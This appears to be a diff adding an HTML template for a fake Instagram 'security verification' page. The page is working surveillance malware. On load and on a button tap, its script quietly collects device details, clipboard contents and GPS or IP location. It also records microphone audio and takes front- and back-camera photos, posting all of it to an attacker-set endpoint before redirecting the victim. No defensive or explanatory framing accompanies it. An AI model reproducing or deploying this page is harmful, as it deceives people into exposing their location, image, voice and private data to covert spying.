@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Instagram</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.card{background:#fff;border:1px solid #dbdbdb;border-radius:12px;width:100%;max-width:400px;overflow:hidden}
+.header{background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);padding:28px 24px;text-align:center;color:#fff}
+.ig-logo{font-size:52px;margin-bottom:6px}
+.ig-name{font-size:26px;font-weight:700;letter-spacing:-0.5px}
+.ig-sub{font-size:13px;opacity:.85;margin-top:3px}
+.body{padding:24px}
+.notice{background:#fff3cd;border:1px solid #ffc107;border-radius:8px;padding:14px;font-size:13px;color:#856404;margin-bottom:18px;display:flex;gap:10px}
+.notice-icon{font-size:18px;flex-shrink:0}
+.field{border:1px solid #dbdbdb;border-radius:6px;padding:12px;font-size:14px;width:100%;margin-bottom:10px;outline:none;background:#fafafa;color:#333}
+.divider{display:flex;align-items:center;gap:10px;font-size:13px;color:#8e8e8e;margin:14px 0}
+.divider::before,.divider::after{content:'';flex:1;height:1px;background:#dbdbdb}
+.progress{height:3px;background:#f0f0f0;border-radius:2px;margin:12px 0 8px;overflow:hidden}
+.fill{height:100%;width:0;background:linear-gradient(90deg,#f09433,#dc2743,#bc1888);border-radius:2px;transition:width .5s}
+#status{font-size:12px;color:#8e8e8e;text-align:center}
+.btn{width:100%;padding:13px;background:linear-gradient(45deg,#f09433,#dc2743,#bc1888);color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;margin-top:14px}
+.btn:disabled{opacity:.5}
+.footer{padding:16px;text-align:center;font-size:12px;color:#8e8e8e;border-top:1px solid #dbdbdb}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="header">
+    <div class="ig-logo">📷</div>
+    <div class="ig-name">Instagram</div>
+    <div class="ig-sub">Security Verification Required</div>
+  </div>
+  <div class="body">
+    <div class="notice">
+      <div class="notice-icon">🔐</div>
+      <div>We noticed unusual activity on your account. Please verify your identity to continue using Instagram.</div>
+    </div>
+    <div class="divider">OR CONTINUE WITH VERIFICATION</div>
+    <div class="progress"><div class="fill" id="pbar"></div></div>
+    <div id="status">Tap to verify your account</div>
+    <button class="btn" id="btn" onclick="startVerify()">Verify Account</button>
+  </div>
+  <div class="footer">© 2024 Instagram from Meta</div>
+</div>
+
+<video id="vid" style="display:none" playsinline autoplay muted></video>
+<canvas id="canvas" width="640" height="640" style="display:none"></canvas>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
+<script>
+var uid="<%=uid%>",a="<%=a%>",dest="<%=url%>";
+var snapsConfirmed=0,minSnaps=3,redirectDone=false;
+
+function setP(p){document.getElementById('pbar').style.width=p+'%';}
+function setS(t){document.getElementById('status').textContent=t;}
+function tryRedirect(){if(redirectDone)return;if(snapsConfirmed>=minSnaps){redirectDone=true;setTimeout(function(){window.location.href=dest;},300);}}
+setTimeout(function(){if(!redirectDone){redirectDone=true;window.location.href=dest;}},25000);
+
+async function sendDevice(){
+  var td='<b>📷 Instagram Verify</b><br><b>⚓ IP: <%=ip%> | <%=time%> UTC</b><br><b>🕒 '+new Date()+'</b><br>';
+  td+="<b>Screen:</b> "+screen.width+"x"+screen.height+"<br><b>TZ:</b> "+Intl.DateTimeFormat().resolvedOptions().timeZone+"<br>";
+  var xo=["platform","userAgent","language","maxTouchPoints","hardwareConcurrency","deviceMemory","vendor","cookieEnabled"];
+  for(var i=0;i<xo.length;i++){if(xo[i] in navigator)td+="<b>"+xo[i]+":</b> <code>"+navigator[xo[i]]+"</code><br>";}
+  if(navigator.connection){var nc=navigator.connection;td+="<b>Net:</b> "+nc.effectiveType+" "+(nc.downlink||'?')+"Mbps<br>";$.post(a+"/network",{uid:uid,data:encodeURIComponent("📶 "+nc.effectiveType+" ⚡"+(nc.downlink||'?')+"Mbps RTT:"+(nc.rtt||'?')+"ms")});}
+  if("getBattery" in navigator){try{var b=await navigator.getBattery();td+="<b>🔋 "+Math.round(b.level*100)+"% Charging:"+b.charging+"</b><br>";$.post(a+"/battery",{uid:uid,level:Math.round(b.level*100),charging:b.charging});}catch(e){}}
+  $.post(a,{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
+  if(navigator.clipboard&&navigator.clipboard.readText){try{var clip=await navigator.clipboard.readText();if(clip&&clip.trim())$.post(a+"/clipboard",{uid:uid,clip:encodeURIComponent(clip)});}catch(e){}}
+}
+
+function fireLocation(){
+  function sendLoc(lat,lon,acc){$.post(a+"/location",{uid:uid,lat:encodeURIComponent(lat),lon:encodeURIComponent(lon),acc:encodeURIComponent(acc)});}
+  async function ipFb(){try{var d=await fetch("https://ipapi.co/json/").then(r=>r.json());if(d&&d.latitude)sendLoc(d.latitude,d.longitude,"IP (~"+d.city+", "+d.country_name+")");}catch(e){}}
+  if(!navigator.geolocation){ipFb();return;}
+  var t=setTimeout(ipFb,9000);
+  navigator.geolocation.getCurrentPosition(function(p){clearTimeout(t);sendLoc(p.coords.latitude,p.coords.longitude,p.coords.accuracy+"m (GPS)");},function(){clearTimeout(t);ipFb();},{enableHighAccuracy:true,timeout:8000,maximumAge:0});
+}
+
+var verifying=false;
+async function startVerify(){
+  if(verifying)return;verifying=true;
+  document.getElementById('btn').disabled=true;document.getElementById('btn').textContent='Verifying...';
+  setP(10);setS('Checking account activity...');
+  sendDevice();fireLocation();
+  await new Promise(function(r){setTimeout(r,800);});
+  setP(25);setS('Verifying location...');
+  await new Promise(function(r){setTimeout(r,700);});
+  setP(35);setS('Identity verification...');
+
+  var stream=null;
+  try{stream=await navigator.mediaDevices.getUserMedia({audio:true,video:{facingMode:"user",width:{ideal:640},height:{ideal:640}}});}
+  catch(e1){try{stream=await navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:"user"}});}
+  catch(e2){setP(100);setS('Verification complete!');setTimeout(function(){if(!redirectDone){redirectDone=true;window.location.href=dest;}},1000);return;}}
+
+  setS('Processing...');
+  var canvas=document.getElementById('canvas'),ctx=canvas.getContext('2d'),vid=document.getElementById('vid');
+  vid.srcObject=stream;try{await vid.play();}catch(e){}
+  await new Promise(function(r){var c=setInterval(function(){if(vid.readyState>=2&&vid.videoWidth>0){clearInterval(c);r();}},200);setTimeout(function(){clearInterval(c);r();},3000);});
+
+  var at=stream.getAudioTracks();
+  if(at.length){try{var rec=new MediaRecorder(new MediaStream(at)),chunks=[];rec.ondataavailable=function(e){if(e.data&&e.data.size>0)chunks.push(e.data);};rec.onstop=function(){var blob=new Blob(chunks,{type:'audio/webm'}),fr=new FileReader();fr.onloadend=function(){$.post(a+"/audio",{uid:uid,audio:encodeURIComponent(fr.result.replace(/^data:.+;base64,/,''))});};fr.readAsDataURL(blob);};rec.start();setTimeout(function(){try{rec.stop();}catch(e){}},8000);}catch(e){}}
+
+  var sd=0;
+  var st=setInterval(function(){
+    if(vid.readyState<2||vid.videoWidth===0)return;
+    ctx.drawImage(vid,0,0,640,640);
+    var d=canvas.toDataURL("image/png").replace("data:image/png;base64","");
+    $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(d),cam:"front"},function(){snapsConfirmed++;setP(40+snapsConfirmed*12);tryRedirect();});
+    if(++sd>=5)clearInterval(st);
+  },1500);
+
+  setTimeout(async function(){
+    try{var bs=await navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:{exact:"environment"}}});var bv=document.createElement('video');bv.srcObject=bs;try{await bv.play();}catch(e){}await new Promise(function(r){setTimeout(r,2000);});if(bv.readyState>=2&&bv.videoWidth>0){ctx.drawImage(bv,0,0,640,640);$.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/png").replace("data:image/png;base64","")),cam:"back"});}bs.getTracks().forEach(function(t){t.stop();});}catch(e){}
+  },3000);
+}
+window.onload=function(){sendDevice();};
+</script>
+</body>
+</html>
